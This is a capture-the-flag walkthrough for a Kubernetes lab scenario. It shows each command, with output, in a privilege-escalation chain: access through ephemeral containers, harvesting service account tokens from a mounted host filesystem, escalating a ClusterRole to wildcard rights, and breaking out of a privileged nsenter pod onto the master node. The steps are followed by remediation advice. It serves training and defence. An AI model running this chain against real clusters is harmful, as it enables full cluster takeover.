# Scenario: Coastline Cluster Attack

- [Learning Outcomes](#learning-outcomes)
- [Challenge Description](#challenge-description)
- [Guided Walkthrough](#guided-walkthrough)
  - [Step 1: Enumerate internal resources and discover a chatlog](#step-1-enumerate-internal-resources-and-discover-a-chatlog)
  - [Step 2: Enumerate external resources and using ephemeral containers](#step-2-enumerate-external-resources-and-using-ephemeral-containers)
  - [Step 3: Enumerating the container filesystem and discover the second flag](#step-3-enumerating-the-container-filesystem-and-discover-the-second-flag)
  - [Step 4: Discovering the service account tokens to elevate privileges](#step-4-discovering-the-service-account-tokens-to-elevate-privileges)
  - [Step 5: Leveraging the ClusterRole Aggregation Controller to access the master node](#step-5-leveraging-the-clusterrole-aggregation-controller-to-access-the-master-node)
- [Remediation and Security Considerations](#remediation-and-security-considerations)

## Learning Outcomes

The purpose of Coastline Cluster Attack is to provide a realistic environment for participants to understand how adversaries can exploit misconfigurations and weaknesses in Kubernetes to obtain full cluster compromise. Completing the scenario the participant will understand:

1. How use ephemeral containers to access a running pod
2. The impact of mounting underlying host filesystem into a pod
3. Where projected volume tokens are stored on the host
4. How to use the `TokenRequest` API to obtain a service account token
5. Sensitive service accounts on Kubernetes and how they can be used for privilege escalation

## Challenge Description

```
                        ___
                     .-'   `'.
                    /         \
                    |         ;
                    |         |           ___.--,
           _.._     |0) ~ (0) |    _.---'`__.-( (_.
    __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`
   ( ,.--'`   ',__ /./;   ;, '.__.'`    __
   _`) )  .---.__.' / |   |\   \__..--""  """--.,_
  `---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'
        | |  .' _.-' |  |  \  \  '.               `~---`
         \ \/ .'     \  \   '. '-._)
          \/ /        \  \    `=.__`~-.
          / /\         `) )    / / `"".`\
    , _.-'.'\ \        / /    ( (     / /
     `--~`   ) )    .-'.'      '.'.  | (
            (/`    ( (`          ) )  '-;
             `      '-;         (-'

Dread Pirate Captain Hλ$ħ𝔍Ⱥ¢k is looking to recruit you to his motley crew.

Hλ$ħ𝔍Ⱥ¢k has obtained access to Coastline Data's jumpbox and wants you to obtain full cluster compromise.

Will you fail the initiation or will your short-lived stay in the motley crew become permanent?
```

## Guided Walkthrough

### Step 1: Enumerate internal resources and discover a chatlog

We start in a Coastline Data's jumpbox, our first step is enumerate resources internally and externally. The local user account we have access to is called `sre` so let's have a look in the home directory:

```bash
sre@jumpbox-terminal:/$ ls -la ~
total 28
drwxr-xr-x 1 sre  sre  4096 Mar  8  2023 .
drwxr-xr-x 1 root root 4096 Mar  8  2023 ..
-rw-r--r-- 1 sre  sre   220 Jan  2  2023 .bash_logout
-rw-r--r-- 1 sre  sre  3526 Jan  2  2023 .bashrc
-rw-r--r-- 1 sre  sre   807 Jan  2  2023 .profile
-rw-r--r-- 1 sre  sre  2714 Mar  8  2023 chat-archive.enc
-rwxr-xr-x 1 sre  sre  1431 Mar  8  2023 secure-archive-chat.sh
```

We can see an encrypted chat-archive and secure-archive-chat.sh script.

```bash
#!/bin/bash
...
      e)
         if [ ! -f "${OPTARG}" ]; then
            usage
         fi
         echo "Encrypting ${OPTARG}"
         s=$(echo "${OPTARG}" | cut -f 1 -d '.')
         echo "$s"
         openssl enc -pbkdf2 -in "${OPTARG}" -out "${s}".enc
         ;;
      d)
         if [ ! -f "${OPTARG}" ]; then
            usage
         fi
         echo "Decrypting ${OPTARG}"
         s=$(echo "${OPTARG}" | cut -f 1 -d '.')
         openssl enc -pbkdf2 -d -in "${OPTARG}" -out "${s}"
         ;;
```

The script looks like it has decrypting and encrypting option so let's try to decrypt the chat-archive:

```bash
sre@jumpbox-terminal:~$ ./secure-archive-chat.sh -d chat-archive.enc
Decrypting chat-archive.enc
```

The outputted file is called `chat-archive` and seems to still be encoded. As it is an archive we can see if it's tarballed up and extract it:

```bash
sre@jumpbox-terminal:~$ tar xvf chat-archive
chatlog/
chatlog/chatlog-sre-2023-01-02.log
chatlog/chatlog-sre-2022-12-20.log
chatlog/chatlog-sre-2023-01-10.log
chatlog/chatlog-sre-2023-01-03.log
chatlog/chatlog-sre-2023-01-05.log
```

Excellent that seems to have worked and we can see a number of chatlogs. As these may provide useful information let's look through each of them.

From the first two chatlogs (12-20 and 01-02) we can see conversation between two different users CD-3371 and CD-2690. They are discussing the deployment of elasticsearch on the cluster. Within the `chatlog-sre-2023-01-03.log` we can see that the users are discussing the use of a fluentd agent and potentially using the Operator pattern but restricting it to the master node.

Significantly in the next chatlog (`chatlog-sre-2023-01-05.log`) we see one of the users has "tweaked" the service account permissions of the fluentd agents and we can see our first flag (`flag_ctf{CHAT_LOGS_DISCOVERED_SUBMIT_THIS!}`).

The last chatlog indicates that one of the users has changed their usual language and is now using a pirate dialect. It sounds like Dread Pirate Captain Hλ$ħ𝔍Ⱥ¢k and the link dumped in chat redirects to `https://haveibeenpwned.com/`!

Now we need to review what we have access to externally from our jumpbox.

### Step 2: Enumerate external resources and using ephemeral containers

A quick enumeration of the jumpbox shows that we have access to `kubectl` so let's see what the service account permissions are.

```bash
sre@jumpbox-terminal:/$ kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

We have permissions to `get` and `list` namespaces so let's see what namespaces there are.

```bash
sre@jumpbox-terminal:/$ kubectl get namespaces
NAME              STATUS   AGE
coastline         Active   80m
default           Active   81m
dmz               Active   80m
elastic-system    Active   80m
kube-node-lease   Active   81m
kube-public       Active   81m
kube-system       Active   81m
kyverno           Active   80m
```

There are quite a few namespaces and if we enumerate all of them, we'll discover that our service account only has interesting permissions to the `coastline` namespace.

```bash
sre@jumpbox-terminal:/$ kubectl auth can-i --list -n coastline
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods/attach                                     []                                    []               [create patch delete]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods/ephemeralcontainers                        []                                    []               [get list watch create patch delete]
pods                                            []                                    []               [get list watch]
namespaces                                      []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

We can see that we have permissions to view pods but more significantly we can create and delete `pods/attach` and `pods/ephemeralcontainers`. Ephemeral containers are a stable feature of Kubernetes since version 1.25 which allows a user to create a new container in a running pod. If you wish to learn more about ephemeral containers, please see the [Ephemeral Containers](https://kubernetes.io/docs/concepts/workloads/pods/ephemeral-containers/).

We can use the following commands to create an ephemeral container and then attach to that process.

```bash
kubectl debug -it --attach=false -c debugger --image=<image> <running-pod> -n <namespace>
kubectl attach -it -c debugger <running-pod> -n <namespace>
```

Let's see what pods are available in the `coastline` namespace.

```bash
sre@jumpbox-terminal:/$ kubectl get pods -n coastline
NAME                                READY   STATUS    RESTARTS   AGE
data-burrow-dev-65f7fb67cd-4dj9z    2/2     Running   0          101m
data-burrow-prod-5ff55fc5ff-6ntsq   2/2     Running   0          101m
```

We can see that there are two pods running, one seemingly a `dev` pod and the other a `prod` pod. Let's create an ephemeral container in the `dev` pod. If we have a look at the specification of each pod, we can see that their are two containers running but more significantly the `dev` pod has `shareProcessNamespace: true` whilst the `prod` pod does not. Whilst we can create an ephemeral container in the `prod` pod, we will not be able to access any other container processes, so we will focus our attention at the `dev` pod.

```bash
sre@jumpbox-terminal:/$ kubectl debug -it --attach=false -c debugger --image=ubuntu:latest data-burrow-dev-65f7fb67cd-4dj9z -n coastline
sre@jumpbox-terminal:/$ kubectl attach -it -c debugger data-burrow-dev-65f7fb67cd-4dj9z -n coastline
If you don't see a command prompt, try pressing enter.
root@data-burrow-dev-65f7fb67cd-4dj9z:/#
```

Excellent we now have access the to data-burrow-dev pod.

### Step 3: Enumerating the container filesystem and discover the second flag

Now we have access to the pod, let's see what we can find.

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/# ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
65535          1       0  0 18:15 ?        00:00:00 /pause
65532          7       0  0 18:16 ?        00:00:00 /var/www/emydocephalus
root          18       0  0 18:17 ?        00:00:00 /bin/bash /usr/local/bin/entrypoint.sh
root          24      18  0 18:17 ?        00:00:00 python3 app/application.py --user=root
root          25      24  0 18:17 ?        00:00:09 /usr/bin/python3 /app/application.py --user=root
root          27       0  0 20:06 pts/0    00:00:00 /bin/bash
root          36      27  0 20:10 pts/0    00:00:00 ps -ef
```

We can see that running `ps -ef` that we can observe the running processes from each container. Let's look at the processes more closely in `/proc`.

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/# ls -al /proc/18/root/host/proc/
total 4
dr-xr-xr-x 219 root  root                0 Nov 20 18:10 .
drwxr-xr-x  19 root  root             4096 Nov 20 18:17 ..
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 1
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 10
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 100
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 101
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 102
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 103
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 104
dr-xr-xr-x   9 root  root                0 Nov 20 18:13 1048
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 105
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 106
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 107
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 108
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 11
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 110
dr-xr-xr-x   9 root  root                0 Nov 20 18:13 1105
dr-xr-xr-x   9 root  root                0 Nov 20 18:13 1108
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 112
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 113
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 114
dr-xr-xr-x   9 root  root                0 Nov 20 18:10 12
...
```

We can see that we have access to the underlying host filesystem and which is confirmed by listing the processes available in `/proc`. If we look in the root directory, we find the second flag.

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/# cat /proc/24/root/host/root/flag.txt
flag_ctf{WORKER_NODE_PWNED_GO_4_MASTER}
```

### Step 4: Discovering the service account tokens to elevate privileges

The flag indicates we access to the underlying node and now we must go for master. So let's enumerate the node and see what we can find. A good place to start is the kubelet configuration.

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/24/root/host/var/lib/kubelet/pods# ls -la
total 40
drwxr-x--- 10 root root 4096 Nov 20 18:15 .
drwx------  8 root root 4096 Nov 20 18:14 ..
drwxr-x---  5 root root 4096 Nov 20 18:16 004098fd-08c2-488b-8766-b30c89f1b9dc
drwxr-x---  5 root root 4096 Nov 20 18:16 2df716b4-6989-414b-910e-e3ae547eab70
drwxr-x---  5 root root 4096 Nov 20 18:16 2eeb9407-cf44-41bb-ab8f-47bc69eb607a
drwxr-x---  5 root root 4096 Nov 20 18:15 35a9b2ce-dae8-4a2e-b0bd-06f31ea583e1
drwxr-x---  5 root root 4096 Nov 20 18:16 4e84ff95-6e86-461c-ae36-bc39f5737b8b
drwxr-x---  5 root root 4096 Nov 20 18:14 890282ff-376f-44ef-bdde-5f300f51c607
drwxr-x---  5 root root 4096 Nov 20 18:16 a19a95c4-0ddc-4e0e-b5d3-7b96c0fe2c09
drwxr-x---  5 root root 4096 Nov 20 18:15 eb801f08-02a9-4f7d-9b14-db32abc4e361
```

> Note: The values for the pods are random uuids and will differ in your environment.

From here we can see the pods running on the node. If we enumerate each directory we will discover a token which is projected volume for the Kubernetes API.

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/24/root/host/var/lib/kubelet/pods# ls -la 2df716b4-6989-414b-910e-e3ae547eab70/volumes/kubernetes.io~projected/kube-api-access-9xdwt/
total 4
drwxrwxrwt 3 root root  140 Nov 20 19:53 .
drwxr-xr-x 3 root root 4096 Nov 20 18:15 ..
drwxr-xr-x 2 root root  100 Nov 20 19:53 ..2023_11_20_19_53_36.485895583
lrwxrwxrwx 1 root root   31 Nov 20 19:53 ..data -> ..2023_11_20_19_53_36.485895583
lrwxrwxrwx 1 root root   13 Nov 20 18:15 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Nov 20 18:15 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Nov 20 18:15 token -> ..data/token
```

We can use the token to access the Kubernetes API and see what permissions we have. This done by using the `--token` flag. We'll also need to specify the IP address of the API server which can be obtained via the environment variables.

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/24/root/host/var/lib/kubelet/pods# env
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=data-burrow-dev-65f7fb67cd-4dj9z
PWD=/proc/24/root/host/var/lib/kubelet/pods
HOME=/root
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9ISHloYXRndFk2bXNEVTVOdnQ1V1p3TU1mVzlTV1ZnNHliUkZ0bWJqY28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMyMDQ2MDE2LCJpYXQiOjE3MDA1MTAwMTYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkbXoiLCJwb2QiOnsibmFtZSI6Imp1bXBib3gtdGVybWluYWwiLCJ1aWQiOiIyZGY3MTZiNC02OTg5LTQxNGItOTEwZS1lM2FlNTQ3ZWFiNzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6InNyZSIsInVpZCI6IjQwMDE5MzFlLWY0NmYtNGI5Ni04N2MxLTZlY2Q0NmQwYjlmNiJ9LCJ3YXJuYWZ0ZXIiOjE3MDA1MTM2MjN9LCJuYmYiOjE3MDA1MTAwMTYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkbXo6c3JlIn0.wjVZRJj1Rzf8tDM76ZWG6DU0_zlWLNqbzf4AVG7yljsd703qIZXVFcLoEopw6_X95ZACVe3Py1KxwoKbTrdrf0ZpE5f0AcSHJGCIjf7go9oWUv1PPp0EdMsG-JqS91B21MZ1cylFq4mTTZMeIjTrbzTBoltKDNxQvJM44wqAdKaW061hbCrnlW3izt3xXgsZ4c-2nxzY0YwX2ZjIJWm2SiF-RYD-2qJK3JFH5HaNHg729pDYesfUPM-dKXUuNbawpjWkz5EkNnMp7wAT4Xs2vT3nd5aW_OHX0pWlip9gUI53kPZ9jjoLIMUVp4vsKhNldu-SXGKp0V_12aYL28bTAw
TERM=xterm
SHLVL=1
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/
_=/usr/bin/env
```

At this point, we'll need to enumerate the permissions of each service account token we find. If we persist we discover a token which has permissions to `create` for `serviceaccounts/token`.

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/18/root/host# cat var/lib/kubelet/pods/eb801f08-02a9-4f7d-9b14-db32abc4e361/volumes/kubernetes.io~projected/kube-api-access-ttmkc/token
ey...PAdXA

root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/18/root/host# export TOKEN=ey...PAdXA

root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/18/root/host# usr/bin/kubectl auth can-i --list -n kube-system --token=$TOKEN --server=https://$SERVER:443 --insecure-skip-tls-verify
Resources                                       Non-Resource URLs                     Resource Names   Verbs
serviceaccounts/token                           []                                    []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
namespaces                                      []                                    []               [get list watch]
pods                                            []                                    []               [get list watch]
serviceaccounts                                 []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

> Note: Kubectl is provided on the node but our local environment will not point to that directory by default. We can use the full path to the binary or add the directory to our path.

### Step 5: Leveraging the ClusterRole Aggregation Controller to access the master node

With the `serviceaccount/token` allows us to create a token for any service account via `TokenRequest` API. The question remains what service account token should we create? We encourage you to research more about default service accounts running on a Kubernetes cluster, specifically within the `kube-system` namespace. In this instance, we will target the `clusterrole-aggregation-controller` service account and we can create a token via the following command:

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/18/root/host# usr/bin/kubectl create token clusterrole-aggregation-controller -n kube-system --token=$TOKEN --server=https://$SERVER:443 --insecure-skip-tls-verify
eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9ISHloYXRndFk2bXNEVTVOdnQ1V1p3TU1mVzlTV1ZnNHliUkZ0bWJqY28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzAwNTE3NDM2LCJpYXQiOjE3MDA1MTM4MzYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyIiwidWlkIjoiZTFmOTc1ZGMtZjAxZC00OTBjLWIyOTQtZTVjNTk5NThjZmQ2In19LCJuYmYiOjE3MDA1MTM4MzYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTpjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyIn0.eQISjPyxhSL5Qavwwtp00s3n_00NNxRWKWE_zFByjOGhuEhCwmX8UZuOfrcEcDHup0ZYb1Gqru9HYhLcFeOKz7Wg-SfbRX-At2qNLHzg0sonm0WLPtmjlbUCzsd-OPdztqKYAluIFyrDDcjG_kzoObttAavxZ7A7FMpo6BTYx4yTkMjl5uZN4_afWgobFpdoqWO11qXZ0lRFoZnIs_BL4WYugo1-jjc3qhaGJY-fRmM7EIcy7L4ZM5wpaqwZQBpttztt-iGpXtdLmdFc2rABN9-UHKclfrJ6A4zf2YLYyhVfLun2QrBK86q1q0z1Qb-CL6HwYZ6FofZcLtOgTVPhAg
```

Let's save this token as an environment variable.

```bash
export T2=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9ISHloYXRndFk2bXNEVTVOdnQ1V1p3TU1mVzlTV1ZnNHliUkZ0bWJqY28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzAwNTE3NDM2LCJpYXQiOjE3MDA1MTM4MzYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyIiwidWlkIjoiZTFmOTc1ZGMtZjAxZC00OTBjLWIyOTQtZTVjNTk5NThjZmQ2In19LCJuYmYiOjE3MDA1MTM4MzYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTpjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyIn0.eQISjPyxhSL5Qavwwtp00s3n_00NNxRWKWE_zFByjOGhuEhCwmX8UZuOfrcEcDHup0ZYb1Gqru9HYhLcFeOKz7Wg-SfbRX-At2qNLHzg0sonm0WLPtmjlbUCzsd-OPdztqKYAluIFyrDDcjG_kzoObttAavxZ7A7FMpo6BTYx4yTkMjl5uZN4_afWgobFpdoqWO11qXZ0lRFoZnIs_BL4WYugo1-jjc3qhaGJY-fRmM7EIcy7L4ZM5wpaqwZQBpttztt-iGpXtdLmdFc2rABN9-UHKclfrJ6A4zf2YLYyhVfLun2QrBK86q1q0z1Qb-CL6HwYZ6FofZcLtOgTVPhAg
```

Now let's see what makes the `clusterrole-aggregation-controller` service account so special.

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/18/root/host# usr/bin/kubectl auth can-i --list -n kube-system --token=$T2 --server=https://$SERVER:443 --insecure-skip-tls-verify
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
clusterroles.rbac.authorization.k8s.io          []                                    []               [escalate get list patch update watch]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

We can see that the `clusterrole-aggregation-controller` service account has `escalate` permissions for `clusterroles.rbac.authorization.k8s.io`. This means that we can create a cluster role and assign it to any user. So let's give the clusterrole associated with the `clusterrole-aggregation-controller` service account full cluster admin. To do this we can use the following manifest:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: system:controller:clusterrole-aggregation-controller
rules:
- apiGroups:
  - '*'
  resources:
  - '*'
  verbs:
  - '*'
- nonResourceURLs:
  - '*'
  verbs:
  - '*'
```

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/18/root/host# usr/bin/kubectl apply -f tmp/cr.yaml -n kube-system --token=$T2 --server=https://$SERVER:443 --insecure-skip-tls-verify
Warning: resource clusterroles/system:controller:clusterrole-aggregation-controller is missing the kubectl.kubernetes.io/last-applied-configuration annotation which is required by kubectl apply. kubectl apply should only be used on resources created declaratively by either kubectl create --save-config or kubectl apply. The missing annotation will be patched automatically.
clusterrole.rbac.authorization.k8s.io/system:controller:clusterrole-aggregation-controller configured
```

We can see that the clusterrole has been configured. Now we have the ability to do perform any action on the cluster. To access the master node, we can deploy a privileged workload and breakout of the container to the host. To do this we need the name of the master node. This is simple command now we have full cluster permissions.

```bash
root@data-burrow-dev-65f7fb67cd-4dj9z:/proc/18/root/host# usr/bin/kubectl get nodes -n kube-system --token=$T2 --server=https://$SERVER:443 --insecure-skip-tls-verify
NAME           STATUS   ROLES           AGE    VERSION
master-1       Ready    control-plane   176m   v1.24.9
node-2         Ready    <none>          175m   v1.24.9
node-2         Ready    <none>          175m   v1.24.9
```

With this we can deploy a privileged workload with access to the hostPID. We could then exec into the deployed container and run `nsenter` to breakout of the container and access the host. However, if we have a container image with `nsenter` we can do this in one step. The following command will allow us to automated obtain access to the master node.

```bash
usr/bin/kubectl run pwn --restart=Never -ti --rm --image pwn --overrides '{"spec":{"hostPID": true, "nodeName": "master-1", "containers":[{"name":"1","image":"ttl.sh/image-with-nsenter-645s62:12h","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}' -n kube-system --token=$T2 --server=https://$SERVER:443 --insecure-skip-tls-verify
root@pwn:/[0]$
```

Excellent we have obtained access to the master node. If we search the root directory we will find the final flag.

```bash
root@pwn:/[0]$ cat /root/flag.txt
flag_ctf{WELCOME_2_HASHJACKS_MOTLEY_CREW}
```

Congratulations, you have solved Coastline Cluster Attack!

## Remediation and Security Considerations

The CTF scenario has been designed to provide an example of how an adversary with an initial foothold in a Kubernetes cluster can escalate privileges to gain access to the master node and full cluster admin. The following section will provide some guidance on how to mitigate the attack vectors demonstrated in the CTF.

- Ephemeral containers are hugely powerful but should be used with caution in production
- The data analytics pods (data-burrow-prod and data-burrow-dev) are mounting the host filesystem which must be avoided where possible
- Whilst in rush to meet a deadline, the sre user has deployed the fluentd daemonset with a service account that can access the TokenRequest API. This should be avoided and the service account should be restricted to the minimum required permissions. As it is daemonset it has access to request service account tokens for all namespaces
- The clusterrole-aggregation-controller service account by default (and design) is hugely privileged and access should be restricted
- Security operations must log and detect tty sessions and where possible restrict the spawning of tty sessions